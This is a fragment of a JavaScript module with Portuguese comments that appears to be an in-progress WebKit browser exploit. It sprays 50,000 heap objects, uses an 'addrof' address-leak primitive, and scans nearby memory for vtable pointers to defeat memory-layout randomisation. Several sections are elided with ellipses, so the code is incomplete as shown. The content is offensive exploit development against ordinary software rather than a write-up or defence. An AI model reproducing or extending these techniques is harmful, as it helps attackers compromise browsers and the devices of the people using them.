// js/script3/testArrayBufferVictimCrash.mjs (v106 - R66 - Estratégia de Spray Agressivo)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// Retorna o foco para a preparação da memória antes do vazamento. Utiliza um "Heap Spray"
// muito mais agressivo (50.000 objetos) para tentar forçar a alocação do nosso
// objeto de teste em uma região de memória mais previsível, na esperança de que o
// endereço vazado por 'addrof' esteja mais próximo da estrutura real do objeto.
// A lógica de varredura de memória (Memory Scan) é mantida.
// =======================================================================================
...
export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_AggressiveSpray_v106_R66";
...
// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (USANDO ESTRATÉGIA DE SPRAY AGRESSIVO)
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Estratégia de Spray Agressivo ---`, "test");

    // --- Constantes Configuráveis ---
    const AGGRESSIVE_SPRAY_SIZE = 50000;
    const SEARCH_RANGE_BYTES = 0x200; // Raio de busca em torno do endereço de referência
    ...
    try {
        ...
        // --- FASE 2: Estabilizando Heap com Spray Agressivo ---
        logS3(`--- FASE 2: Estabilizando Heap com Spray Agressivo (${AGGRESSIVE_SPRAY_SIZE} objetos)... ---`, "subtest");
        const spray = [];
        for (let i = 0; i < AGGRESSIVE_SPRAY_SIZE; i++) {
            spray.push({ a: i, b: 0xCAFEBABE });
        }
        const test_obj = spray[Math.floor(AGGRESSIVE_SPRAY_SIZE / 2)]; // Pega um objeto do meio do spray
        ...
        logS3(`--- FASE 3: Procurando V-Table na vizinhança (raio de ${SEARCH_RANGE_BYTES} bytes)... ---`, "subtest");
        ...
        for (let current_addr = start_addr; current_addr.low() < end_addr.low(); current_addr = current_addr.add(8)) {
            ...
            if (vtable_candidate && vtable_candidate.high() > 0x10000) {
    ...
    return {
        ...
        oob_value_of_best_result: 'N/A (Estratégia de Spray Agressivo)',
        tc_probe_details: { strategy: 'Uncaged Aggressive Spray Strategy' }
    };
}
